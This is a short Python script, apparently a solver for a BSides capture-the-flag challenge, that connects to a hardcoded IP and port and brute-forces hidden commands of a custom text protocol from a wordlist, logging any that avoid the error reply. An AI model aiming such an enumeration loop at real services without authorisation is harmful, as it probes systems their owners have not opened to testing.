#!/usr/bin/python3

import socket
import time

# Configuration
HOST = '13.232.135.193'  # Change to the server IP if testing remotely
PORT = 13375
START_TOKEN = "#bsides# "
END_TOKEN = " #end#"
INVALID_COMMAND_RESPONSE = f"{START_TOKEN}Use help command{END_TOKEN}"

def load_wordlist():
    print("Loading the wordlist.")
    words = []
    with open("keywords.txt") as fp:
        for line in fp:
            word = line.strip()
            if word:
                words.append(word)
    return words


def main():
    words = load_wordlist()
    secret_commands = []

    # Establish connection as we can use the same connection.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))
        welcome_msg = client_socket.recv(1024)
        if welcome_msg:
            welcome_msg = welcome_msg.decode()
            print(f"[+] Received welcome message -> {welcome_msg}")

        # Lets start trying out our commands.
        for word in words:
            print("=====" * 20)
            command = f"{START_TOKEN}{word}{END_TOKEN}"
            print(f"[*] Sending command: {word}")
            client_socket.sendall(command.encode())
            response = client_socket.recv(1024).decode()
            if response.strip() == INVALID_COMMAND_RESPONSE:
                print("[-] This is not a valid command.")
            else:
                print("[+] We did not receive the error response.")
                print(f"[+] [SERVER RESPONSE] {response}")
                secret_commands.append(command)

            print("[*] Sleeping for 1 second.")
            time.sleep(1)

    print("=====" * 20)
    print("[*] Finished bruteforcing!")
    if secret_commands:
        print(f"[+] Found following secret commands: \n" + '\n'.join(secret_commands))


if __name__ == "__main__":
    print("BSides Text Transfer Protocol (BTTP) Bruteforce Utility.")
    main()
